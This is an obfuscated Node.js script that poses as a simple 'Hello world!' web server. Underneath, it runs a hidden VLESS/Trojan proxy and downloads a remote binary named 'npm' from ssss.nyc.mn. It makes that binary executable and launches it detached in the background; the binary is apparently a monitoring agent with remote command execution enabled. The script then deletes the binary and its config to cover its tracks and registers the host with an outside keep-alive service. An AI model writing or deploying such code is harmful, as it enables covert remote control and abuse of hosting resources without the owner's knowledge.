function _0x2296(){const _0x32f4af=['https://amd64.ssss.nyc.mn/agent','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','arm64','finish','reduce','\x20with\x20all\x20DNS\x20servers','Status','https://','4418016MFMCnj','Server','WSPATH','decode','hex','every','https://dns.google/resolve?name=','config.yaml','send','slice','post','8.8.4.4','join','sha224','58473ldbeFl','arm','net','sub','&type=A','npm\x20running\x20error:','writeHead','aarch64','Server\x20is\x20running\x20on\x20port\x20','npm\x20download\x20successfully','get','NEZHA_SERVER','4544078KevWYw','error','createServer','Answer','client_secret:\x20','Hello\x20world!','5mnMLRV','split','\x20-p\x20','concat','8443','text/html','2083','axios','https://api.ip.sb/geoip','&fp=chrome&type=ws&host=','2087','buffer','type','8032321mloOQR','toString','unlink','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','length','text/plain','1234.abc.com','isp','crypto','once','includes','98febc64-e993-4d25-9d5b-376a0f6c8a4e','361548MhDokZ','log','12DyvdyP','application/json','&path=%2F','then','http','base64','data','--tls','Unknown','url','npm\x20is\x20already\x20running,\x20skip\x20running...','map','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','replace','54958bwqGpl','listen','env','readFile','https://oooo.serv00.net/add-url','912mMIBcu','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','4450250aDUJAj','false','utf8','close','readUInt16BE','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','digest','find','index.html','3RImviy','21tTdpof','Automatic\x20Access\x20Task\x20added\x20successfully','2096','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','443','/bin/bash','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','message','npm\x20is\x20running','npm','PORT','country_code','pop','writeFileSync','catch','connect','setsid\x20nohup\x20./npm\x20-s\x20','UUID','update','application/dns-json','write','https://amd64.ssss.nyc.mn/v1','true','https://arm64.ssss.nyc.mn/agent','utf-8','readUInt8','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','chmod\x20+x\x20npm','pipe','error:\x20','child_process'];_0x2296=function(){return _0x32f4af;};return _0x2296();}const _0x2f00cc=_0x306e;(function(_0x328e6e,_0x55597d){const _0x5d9f63=_0x306e,_0x21301b=_0x328e6e();while(!![]){try{const _0x1fbf90=parseInt(_0x5d9f63(0x1cd))/0x1*(-parseInt(_0x5d9f63(0x1bc))/0x2)+parseInt(_0x5d9f63(0x1cc))/0x3*(parseInt(_0x5d9f63(0x1ac))/0x4)+parseInt(_0x5d9f63(0x214))/0x5*(-parseInt(_0x5d9f63(0x1f4))/0x6)+parseInt(_0x5d9f63(0x20e))/0x7+parseInt(_0x5d9f63(0x1c1))/0x8*(parseInt(_0x5d9f63(0x202))/0x9)+-parseInt(_0x5d9f63(0x1c3))/0xa+parseInt(_0x5d9f63(0x221))/0xb*(parseInt(_0x5d9f63(0x1ae))/0xc);if(_0x1fbf90===_0x55597d)break;else _0x21301b['push'](_0x21301b['shift']());}catch(_0x59f21d){_0x21301b['push'](_0x21301b['shift']());}}}(_0x2296,0x6e596));const os=require('os'),http=require(_0x2f00cc(0x1b2)),fs=require('fs'),axios=require(_0x2f00cc(0x21b)),net=require(_0x2f00cc(0x204)),path=require('path'),crypto=require(_0x2f00cc(0x1a8)),{Buffer}=require(_0x2f00cc(0x21f)),{exec,execSync}=require(_0x2f00cc(0x1eb)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2f00cc(0x1be)][_0x2f00cc(0x1de)]||_0x2f00cc(0x1ab),NEZHA_SERVER=process[_0x2f00cc(0x1be)][_0x2f00cc(0x20d)]||'',NEZHA_PORT=process[_0x2f00cc(0x1be)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2f00cc(0x1be)]['NEZHA_KEY']||'',DOMAIN=process[_0x2f00cc(0x1be)]['DOMAIN']||_0x2f00cc(0x1a6),AUTO_ACCESS=process[_0x2f00cc(0x1be)]['AUTO_ACCESS']||![],WSPATH=process['env'][_0x2f00cc(0x1f6)]||UUID[_0x2f00cc(0x1fd)](0x0,0x8),SUB_PATH=process[_0x2f00cc(0x1be)]['SUB_PATH']||_0x2f00cc(0x205),NAME=process['env']['NAME']||'',PORT=process['env'][_0x2f00cc(0x1d7)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x4c4a12=_0x2f00cc;try{const _0x5c2c68=await axios[_0x4c4a12(0x20c)](_0x4c4a12(0x21c)),_0x256d6f=_0x5c2c68[_0x4c4a12(0x1b4)];ISP=(_0x256d6f[_0x4c4a12(0x1d8)]+'-'+_0x256d6f[_0x4c4a12(0x1a7)])[_0x4c4a12(0x1bb)](/ /g,'_');}catch(_0x21e972){ISP=_0x4c4a12(0x1b6);}};GetISP();const httpServer=http[_0x2f00cc(0x210)]((_0x186217,_0x57630f)=>{const _0x41d5cf=_0x2f00cc;if(_0x186217[_0x41d5cf(0x1b7)]==='/'){const _0x3efdb9=path['join'](__dirname,_0x41d5cf(0x1cb));fs[_0x41d5cf(0x1bf)](_0x3efdb9,_0x41d5cf(0x1c5),(_0x2ab557,_0x220560)=>{const _0x280470=_0x41d5cf;if(_0x2ab557){_0x57630f[_0x280470(0x208)](0xc8,{'Content-Type':'text/html'}),_0x57630f['end'](_0x280470(0x213));return;}_0x57630f[_0x280470(0x208)](0xc8,{'Content-Type':_0x280470(0x219)}),_0x57630f['end'](_0x220560);});return;}else{if(_0x186217[_0x41d5cf(0x1b7)]==='/'+SUB_PATH){const _0x5d4042=NAME?NAME+'-'+ISP:ISP,_0x5ed234='vless://'+UUID+_0x41d5cf(0x1d3)+DOMAIN+_0x41d5cf(0x21d)+DOMAIN+_0x41d5cf(0x1b0)+WSPATH+'#'+_0x5d4042,_0x28382b='trojan://'+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0x41d5cf(0x21d)+DOMAIN+_0x41d5cf(0x1b0)+WSPATH+'#'+_0x5d4042,_0x199e68=_0x5ed234+'\x0a'+_0x28382b,_0x5a815c=Buffer['from'](_0x199e68)[_0x41d5cf(0x222)](_0x41d5cf(0x1b3));_0x57630f[_0x41d5cf(0x208)](0xc8,{'Content-Type':'text/plain'}),_0x57630f['end'](_0x5a815c+'\x0a');}else _0x57630f[_0x41d5cf(0x208)](0x194,{'Content-Type':_0x41d5cf(0x226)}),_0x57630f['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x2f00cc(0x1f5))]({'server':httpServer}),uuid=UUID[_0x2f00cc(0x1bb)](/-/g,''),DNS_SERVERS=[_0x2f00cc(0x1ff),'1.1.1.1'];function resolveHost(_0x87f655){return new Promise((_0xfd76b3,_0x558085)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x87f655)){_0xfd76b3(_0x87f655);return;}let _0x1b91e1=0x0;function _0x52f26c(){const _0x277240=_0x306e;if(_0x1b91e1>=DNS_SERVERS[_0x277240(0x225)]){_0x558085(new Error('Failed\x20to\x20resolve\x20'+_0x87f655+_0x277240(0x1f1)));return;}const _0x4f793e=DNS_SERVERS[_0x1b91e1];_0x1b91e1++;const _0x4a7c30=_0x277240(0x1fa)+encodeURIComponent(_0x87f655)+_0x277240(0x206);axios[_0x277240(0x20c)](_0x4a7c30,{'timeout':0x1388,'headers':{'Accept':_0x277240(0x1e0)}})[_0x277240(0x1b1)](_0x137662=>{const _0x220979=_0x277240,_0x2e0771=_0x137662[_0x220979(0x1b4)];if(_0x2e0771[_0x220979(0x1f2)]===0x0&&_0x2e0771[_0x220979(0x211)]&&_0x2e0771[_0x220979(0x211)][_0x220979(0x225)]>0x0){const _0x384814=_0x2e0771[_0x220979(0x211)][_0x220979(0x1ca)](_0x15c0dd=>_0x15c0dd[_0x220979(0x220)]===0x1);if(_0x384814){_0xfd76b3(_0x384814[_0x220979(0x1b4)]);return;}}_0x52f26c();})[_0x277240(0x1db)](_0x1ebce0=>{_0x52f26c();});}_0x52f26c();});}function handleVlessConnection(_0x3c2455,_0x4cac89){const _0x132863=_0x2f00cc,[_0x3a6fdb]=_0x4cac89,_0x212bb0=_0x4cac89[_0x132863(0x1fd)](0x1,0x11);if(!_0x212bb0[_0x132863(0x1f9)]((_0x2868cf,_0x16f692)=>_0x2868cf==parseInt(uuid['substr'](_0x16f692*0x2,0x2),0x10)))return![];let _0x2455f4=_0x4cac89[_0x132863(0x1fd)](0x11,0x12)[_0x132863(0x1e6)]()+0x13;const _0x378c54=_0x4cac89['slice'](_0x2455f4,_0x2455f4+=0x2)[_0x132863(0x1c7)](0x0),_0x512a9b=_0x4cac89[_0x132863(0x1fd)](_0x2455f4,_0x2455f4+=0x1)[_0x132863(0x1e6)](),_0x2d6bbe=_0x512a9b==0x1?_0x4cac89[_0x132863(0x1fd)](_0x2455f4,_0x2455f4+=0x4)[_0x132863(0x200)]('.'):_0x512a9b==0x2?new TextDecoder()[_0x132863(0x1f7)](_0x4cac89[_0x132863(0x1fd)](_0x2455f4+0x1,_0x2455f4+=0x1+_0x4cac89[_0x132863(0x1fd)](_0x2455f4,_0x2455f4+0x1)[_0x132863(0x1e6)]())):_0x512a9b==0x3?_0x4cac89[_0x132863(0x1fd)](_0x2455f4,_0x2455f4+=0x10)[_0x132863(0x1f0)]((_0x1f2a40,_0x62e05f,_0x301522,_0x1dbc8d)=>_0x301522%0x2?_0x1f2a40['concat'](_0x1dbc8d[_0x132863(0x1fd)](_0x301522-0x1,_0x301522+0x1)):_0x1f2a40,[])[_0x132863(0x1b9)](_0x5df1ed=>_0x5df1ed['readUInt16BE'](0x0)['toString'](0x10))[_0x132863(0x200)](':'):'';_0x3c2455[_0x132863(0x1fc)](new Uint8Array([_0x3a6fdb,0x0]));const _0x579281=createWebSocketStream(_0x3c2455);return resolveHost(_0x2d6bbe)[_0x132863(0x1b1)](_0x8dca25=>{const _0x1484bc=_0x132863;net[_0x1484bc(0x1dc)]({'host':_0x8dca25,'port':_0x378c54},function(){const _0x24dd64=_0x1484bc;this['write'](_0x4cac89[_0x24dd64(0x1fd)](_0x2455f4)),_0x579281['on'](_0x24dd64(0x20f),()=>{})[_0x24dd64(0x1e9)](this)['on'](_0x24dd64(0x20f),()=>{})[_0x24dd64(0x1e9)](_0x579281);})['on']('error',()=>{});})[_0x132863(0x1db)](_0x474602=>{const _0x1d3709=_0x132863;net['connect']({'host':_0x2d6bbe,'port':_0x378c54},function(){const _0x177682=_0x306e;this[_0x177682(0x1e1)](_0x4cac89[_0x177682(0x1fd)](_0x2455f4)),_0x579281['on']('error',()=>{})[_0x177682(0x1e9)](this)['on'](_0x177682(0x20f),()=>{})[_0x177682(0x1e9)](_0x579281);})['on'](_0x1d3709(0x20f),()=>{});}),!![];}function _0x306e(_0x150488,_0x287aba){_0x150488=_0x150488-0x1a6;const _0x229684=_0x2296();let _0x306e6e=_0x229684[_0x150488];return _0x306e6e;}function handleTrojanConnection(_0x387587,_0x42dd7c){const _0x3bb842=_0x2f00cc;try{if(_0x42dd7c[_0x3bb842(0x225)]<0x3a)return![];const _0x26af86=_0x42dd7c[_0x3bb842(0x1fd)](0x0,0x38)['toString'](),_0x1de7c5=[UUID];let _0x41c11c=null;for(const _0x201d91 of _0x1de7c5){const _0x6dc1ba=crypto['createHash'](_0x3bb842(0x201))[_0x3bb842(0x1df)](_0x201d91)[_0x3bb842(0x1c9)](_0x3bb842(0x1f8));if(_0x6dc1ba===_0x26af86){_0x41c11c=_0x201d91;break;}}if(!_0x41c11c)return![];let _0x5aa5a6=0x38;_0x42dd7c[_0x5aa5a6]===0xd&&_0x42dd7c[_0x5aa5a6+0x1]===0xa&&(_0x5aa5a6+=0x2);const _0x517b86=_0x42dd7c[_0x5aa5a6];if(_0x517b86!==0x1)return![];_0x5aa5a6+=0x1;const _0x4216bd=_0x42dd7c[_0x5aa5a6];_0x5aa5a6+=0x1;let _0x320a23,_0x40d8d5;if(_0x4216bd===0x1)_0x320a23=_0x42dd7c[_0x3bb842(0x1fd)](_0x5aa5a6,_0x5aa5a6+0x4)[_0x3bb842(0x200)]('.'),_0x5aa5a6+=0x4;else{if(_0x4216bd===0x3){const _0x5cfdf2=_0x42dd7c[_0x5aa5a6];_0x5aa5a6+=0x1,_0x320a23=_0x42dd7c[_0x3bb842(0x1fd)](_0x5aa5a6,_0x5aa5a6+_0x5cfdf2)[_0x3bb842(0x222)](),_0x5aa5a6+=_0x5cfdf2;}else{if(_0x4216bd===0x4)_0x320a23=_0x42dd7c[_0x3bb842(0x1fd)](_0x5aa5a6,_0x5aa5a6+0x10)[_0x3bb842(0x1f0)]((_0x20f0f9,_0x3136aa,_0x4e86f3,_0x4383e6)=>_0x4e86f3%0x2?_0x20f0f9[_0x3bb842(0x217)](_0x4383e6[_0x3bb842(0x1fd)](_0x4e86f3-0x1,_0x4e86f3+0x1)):_0x20f0f9,[])['map'](_0x4aa8f8=>_0x4aa8f8['readUInt16BE'](0x0)[_0x3bb842(0x222)](0x10))['join'](':'),_0x5aa5a6+=0x10;else return![];}}_0x40d8d5=_0x42dd7c['readUInt16BE'](_0x5aa5a6),_0x5aa5a6+=0x2;_0x5aa5a6<_0x42dd7c[_0x3bb842(0x225)]&&_0x42dd7c[_0x5aa5a6]===0xd&&_0x42dd7c[_0x5aa5a6+0x1]===0xa&&(_0x5aa5a6+=0x2);const _0x27cd5f=createWebSocketStream(_0x387587);return resolveHost(_0x320a23)['then'](_0x30f463=>{const _0x28f7fb=_0x3bb842;net[_0x28f7fb(0x1dc)]({'host':_0x30f463,'port':_0x40d8d5},function(){const _0x5b8295=_0x28f7fb;_0x5aa5a6<_0x42dd7c[_0x5b8295(0x225)]&&this[_0x5b8295(0x1e1)](_0x42dd7c[_0x5b8295(0x1fd)](_0x5aa5a6)),_0x27cd5f['on'](_0x5b8295(0x20f),()=>{})[_0x5b8295(0x1e9)](this)['on'](_0x5b8295(0x20f),()=>{})[_0x5b8295(0x1e9)](_0x27cd5f);})['on'](_0x28f7fb(0x20f),()=>{});})[_0x3bb842(0x1db)](_0x910ce6=>{const _0x13be1b=_0x3bb842;net['connect']({'host':_0x320a23,'port':_0x40d8d5},function(){const _0x4bbc8c=_0x306e;_0x5aa5a6<_0x42dd7c['length']&&this[_0x4bbc8c(0x1e1)](_0x42dd7c[_0x4bbc8c(0x1fd)](_0x5aa5a6)),_0x27cd5f['on'](_0x4bbc8c(0x20f),()=>{})[_0x4bbc8c(0x1e9)](this)['on'](_0x4bbc8c(0x20f),()=>{})[_0x4bbc8c(0x1e9)](_0x27cd5f);})['on'](_0x13be1b(0x20f),()=>{});}),!![];}catch(_0x257c69){return![];}}wss['on']('connection',(_0x4ad5d6,_0x34d02f)=>{const _0x2de69c=_0x2f00cc,_0x3efc60=_0x34d02f[_0x2de69c(0x1b7)]||'';_0x4ad5d6[_0x2de69c(0x1a9)](_0x2de69c(0x1d4),_0x368d17=>{const _0x2d0a55=_0x2de69c;if(_0x368d17[_0x2d0a55(0x225)]>0x11&&_0x368d17[0x0]===0x0){const _0x50e6e6=_0x368d17[_0x2d0a55(0x1fd)](0x1,0x11),_0x407ee6=_0x50e6e6[_0x2d0a55(0x1f9)]((_0x75a4c6,_0x15c1de)=>_0x75a4c6==parseInt(uuid['substr'](_0x15c1de*0x2,0x2),0x10));if(_0x407ee6){!handleVlessConnection(_0x4ad5d6,_0x368d17)&&_0x4ad5d6[_0x2d0a55(0x1c6)]();return;}}!handleTrojanConnection(_0x4ad5d6,_0x368d17)&&_0x4ad5d6[_0x2d0a55(0x1c6)]();})['on'](_0x2de69c(0x20f),()=>{});});const getDownloadUrl=()=>{const _0x39d137=_0x2f00cc,_0x45b948=os['arch']();return _0x45b948===_0x39d137(0x203)||_0x45b948===_0x39d137(0x1ee)||_0x45b948===_0x39d137(0x209)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x39d137(0x1e4):!NEZHA_PORT?_0x39d137(0x1e2):_0x39d137(0x1ec);},downloadFile=async()=>{const _0x13ca39=_0x2f00cc;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2a7e4e=getDownloadUrl(),_0xe46fe2=await axios({'method':_0x13ca39(0x20c),'url':_0x2a7e4e,'responseType':'stream'}),_0x1d0ba9=fs['createWriteStream'](_0x13ca39(0x1d6));return _0xe46fe2[_0x13ca39(0x1b4)][_0x13ca39(0x1e9)](_0x1d0ba9),new Promise((_0x543583,_0x27df5a)=>{const _0x1225d7=_0x13ca39;_0x1d0ba9['on'](_0x1225d7(0x1ef),()=>{const _0x2fc0f1=_0x1225d7;console[_0x2fc0f1(0x1ad)](_0x2fc0f1(0x20b)),exec(_0x2fc0f1(0x1e8),_0x37725c=>{if(_0x37725c)_0x27df5a(_0x37725c);_0x543583();});}),_0x1d0ba9['on'](_0x1225d7(0x20f),_0x27df5a);});}catch(_0x5686c3){throw _0x5686c3;}},runnz=async()=>{const _0x255c7a=_0x2f00cc;try{const _0x4bbd5f=execSync(_0x255c7a(0x1e7),{'encoding':_0x255c7a(0x1e5)});if(_0x4bbd5f['trim']()!==''){console[_0x255c7a(0x1ad)](_0x255c7a(0x1b8));return;}}catch(_0x43a50c){}await downloadFile();let _0xa626cf='',_0x90a967=[_0x255c7a(0x1d1),_0x255c7a(0x218),_0x255c7a(0x1cf),_0x255c7a(0x21e),_0x255c7a(0x21a),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x34ca25=_0x90a967['includes'](NEZHA_PORT)?_0x255c7a(0x1b5):'';_0xa626cf=_0x255c7a(0x1dd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x255c7a(0x216)+NEZHA_KEY+'\x20'+_0x34ca25+_0x255c7a(0x1ed);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1f6d44=NEZHA_SERVER[_0x255c7a(0x1aa)](':')?NEZHA_SERVER[_0x255c7a(0x215)](':')[_0x255c7a(0x1d9)]():'',_0x4f2968=_0x90a967[_0x255c7a(0x1aa)](_0x1f6d44)?_0x255c7a(0x1e3):_0x255c7a(0x1c4),_0x2c8205=_0x255c7a(0x212)+NEZHA_KEY+_0x255c7a(0x224)+NEZHA_SERVER+_0x255c7a(0x1c2)+_0x4f2968+_0x255c7a(0x1d0)+UUID;fs[_0x255c7a(0x1da)](_0x255c7a(0x1fb),_0x2c8205);}_0xa626cf=_0x255c7a(0x1ba);}else{console['log'](_0x255c7a(0x1c8));return;}}try{exec(_0xa626cf,{'shell':_0x255c7a(0x1d2)},_0x3fbc22=>{const _0x5958e6=_0x255c7a;if(_0x3fbc22)console[_0x5958e6(0x20f)](_0x5958e6(0x207),_0x3fbc22);else console['log'](_0x5958e6(0x1d5));});}catch(_0x443141){console[_0x255c7a(0x20f)](_0x255c7a(0x1ea)+_0x443141);}};async function addAccessTask(){const _0x57dde1=_0x2f00cc;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2fb492=_0x57dde1(0x1f3)+DOMAIN+'/'+SUB_PATH;try{const _0xb2ff0a=await axios[_0x57dde1(0x1fe)](_0x57dde1(0x1c0),{'url':_0x2fb492},{'headers':{'Content-Type':_0x57dde1(0x1af)}});console['log'](_0x57dde1(0x1ce));}catch(_0x53a5d1){}}const delFiles=()=>{const _0x35c271=_0x2f00cc;fs['unlink'](_0x35c271(0x1d6),()=>{}),fs[_0x35c271(0x223)]('config.yaml',()=>{});};httpServer[_0x2f00cc(0x1bd)](PORT,()=>{const _0x3e3b32=_0x2f00cc;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3e3b32(0x1ad)](_0x3e3b32(0x20a)+PORT);});
